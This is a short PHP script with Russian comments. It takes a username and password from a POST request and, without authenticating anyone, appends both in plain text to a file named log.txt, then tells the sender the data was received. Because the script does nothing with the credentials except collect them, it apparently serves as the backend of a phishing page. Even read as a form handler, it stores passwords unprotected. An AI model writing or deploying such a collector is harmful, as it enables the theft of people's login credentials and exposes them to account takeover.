<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Проверяем наличие данных
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Проверка на пустоту
        if (empty($username) || empty($password)) {
            echo "Ошибка: Логин или пароль не заполнены.";
            exit;
        }

        // Логируем данные
        $log_file = 'log.txt';
        $log_data = "Username: $username, Password: $password\n";
        file_put_contents($log_file, $log_data, FILE_APPEND);

        echo "Данные успешно получены.";
    } else {
        echo "Ошибка: Нет данных для обработки.";
    }
} else {
    echo "Ошибка: Данные не были отправлены.";
}
?>
